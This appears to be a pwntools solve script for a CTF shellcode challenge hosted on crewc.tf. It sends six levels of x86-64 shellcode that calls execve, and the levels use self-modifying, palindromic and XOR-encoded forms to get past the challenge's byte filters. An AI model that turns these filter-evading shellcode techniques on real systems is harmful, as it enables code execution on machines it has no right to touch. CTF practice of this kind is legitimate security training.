from pwn import *
from icecream import ic

io = remote("shellcode-game-x64.chal.crewc.tf", 1337)
context.log_level = 'debug'
context.arch = 'x86-64'

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

level1 = asm('''
    xor rax, rax            
    push rax            
    mov rbx, 0x6e69772f   
    push rbx                
    mov rdi, rsp          
    xor rsi, rsi            
    xor rdx, rdx            
    mov rax, 0x3b         
    syscall      
''')
print(level1.hex())
sla(b"Enter your x86_64 shellcode in hex: ", level1.hex().encode())


# 48 31 c0 50 48 c7 c3 2f 77 69 6e 53 48 89 e7 48 31 f6 48 31 d2 48 c7 c0 3b 00 00 00 0f 05
level2 = asm('''
    add byte ptr [rip+0+0xcb-0], 0x1f
    add byte ptr [rip+0+0xcb-7], 0xa
    add byte ptr [rip+1+0xcb-14], 0x12
    add byte ptr [rip+3+0xcb-21], 0x1f
    add byte ptr [rip+3+0xcb-28], 0x12
    add byte ptr [rip+4+0xcb-35+0x67], 0x1f
    add byte ptr [rip+4+0xcb-42+0x67], 0xa
    add byte ptr [rip+7+0xcb-49+0x67], 0x10
    add byte ptr [rip+8+0xcb-56+0x67], 0x1f
    add byte ptr [rip+8+0xcb-63+0x67], 0x1f
    add byte ptr [rip+8+0xcb-70+0x67], 0x1a
    add byte ptr [rip+9+0xcb-77+0x67], 0x1f
    add byte ptr [rip+9+0xcb-84+0x67], 0x1f
    add byte ptr [rip+9+0xcb-91+0x67], 0xc
    add byte ptr [rip+10+0xcb-98+0x67], 0x1f
    add byte ptr [rip+10+0xcb-105+0x67], 0x1f
    add byte ptr [rip+10+0xcb-112+0x67], 0x11
    add byte ptr [rip+11+0xcb-119+0x67], 0x1f
    add byte ptr [rip+11+0xcb-126+0x67], 0x15
    add byte ptr [rip+12+0xcb-133+0x67], 0x1f
    add byte ptr [rip+12+0xcb-140+0x67], 0xa
    add byte ptr [rip+15+0xcb-147+0x67], 0x1f
    add byte ptr [rip+15+0xcb-154+0x67], 0xa
    add byte ptr [rip+16+0xcb-161+0x67], 0x12
    add byte ptr [rip+18+0xcb-168+0x67], 0x1f
    add byte ptr [rip+18+0xcb-175+0x67], 0xa
    add byte ptr [rip+19+0xcb-182+0x67], 0x12
    add byte ptr [rip+21+0xcb-189+0x67], 0x1f
    add byte ptr [rip+21+0xcb-196+0x67], 0xa
    add byte ptr [rip+24+0xcb-203+0x67], 0x1c
''')

# payload += b'H1\xc0PH\xc7\xc3/winSH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05'
level2 += b'\x1f\x1f\xc0\x1f'
level2 += b'\x90'*0x67
level2 += b'\x1f\xc7\xc3\x1f\x1f\x1f\x1f\x1f\x1f\x89\xe7\x1f\x1f\xf6\x1f\x1f\xd2\x1f\xc7\xc0\x1f\x00\x00\x00\x0f\x05'
print(level2.hex())
sla(b"Enter your x86_64 shellcode in hex: ", level2.hex().encode())



def make_palindrome(s):
    segments = [s[i:i+2] for i in range(0, len(s), 2)]
    reversed_segments = segments[::-1]
    reversed_s = ''.join(reversed_segments)
    palindrome = s + reversed_s
    return palindrome

original_string = level1.hex()
level3 = make_palindrome(original_string)
sla(b"Enter your x86_64 shellcode in hex: ", level3.encode())
print(make_palindrome('eb1c050f3bb0d23148f63148e7894853000000006e69772fbb4850c03148'))

level4 = asm('''
    mov rdi,0x6e69772f 
    push rdi
    mov rdi, rsp
    mov rax, 0x3b
    mov rdx, 0x0
    mov rsi, 0x0
    mov r12, 0xd
    mov r8, 0x9090909090909090
    label:
        dec r12
        lea r9,[rip]
        mov qword ptr [r9+r12*8],r8
        cmp r12, 3
        jne label
        mov dword ptr [rip+0xb*8 - 4], 0x050f
        nop
        nop
''')
level4 = make_palindrome(level4.hex())
sla(b"Enter your x86_64 shellcode in hex: ", level4.encode())

level5 = asm('''
    push 0x3b
    push 0x0
    push 0x0
    push 0x0
    pop rdi
    pop rdx
    pop rsi
    pop rax
    inc edi;shl edi,1;inc edi;shl edi,1;shl edi,1;inc edi;shl edi,1;inc edi;shl edi,1;inc edi;shl edi,1;shl edi,1;shl edi,1;inc edi;shl edi,1;inc edi;shl edi,1;shl edi,1;inc edi;shl edi,1;shl edi,1;shl edi,1;inc edi;shl edi,1;shl edi,1;inc edi;shl edi,1;inc edi;shl edi,1;inc edi;shl edi,1;shl edi,1;inc edi;shl edi,1;inc edi;shl edi,1;inc edi;shl edi,1;shl edi,1;shl edi,1;inc edi;shl edi,1;shl edi,1;inc edi;shl edi,1;inc edi;shl edi,1;inc edi;shl edi,1;inc edi; 
    push rdi
    push rsp
    pop rdi
    syscall
''')
sla(b"Enter your x86_64 shellcode in hex: ", level5.hex().encode())

level6 = asm('''
    and eax, 0x02020202
    or eax, 0x02020202
    xor eax, 0x02020202
    xor eax, 0x0202022f
    xor eax, 0x02020200
    or eax, 0x02025300
    or eax, 0x02026500
    xor eax, 0x02020000
        
    xor eax, 0x03020000
    xor eax, 0x036b0000
    xor eax, 0x03000000
    xor eax, 0x6d000000
    mov edi, eax
    
    mov ebx, edi
    and eax, 0x02020202
    or eax, 0x02020202
    xor eax, 0x02020202
    xor eax, 0x0202023b
    xor eax, 0x02020200

    push rbx
    add dword ptr [rip+7], 5
    add dword ptr [rip+2], 2
''')

level6 += b'\x43\x89\xe5'

level6 += asm('''
    add dword ptr [rip+17], 7
    xor eax, 0x02020200
    xor eax, 0x02020200
    add dword ptr [rip], 3
''')

level6 += b'\x05\x05'
print(disasm(level6))
sla(b"Enter your x86_64 shellcode in hex: ", level6.hex().encode())
io.interactive()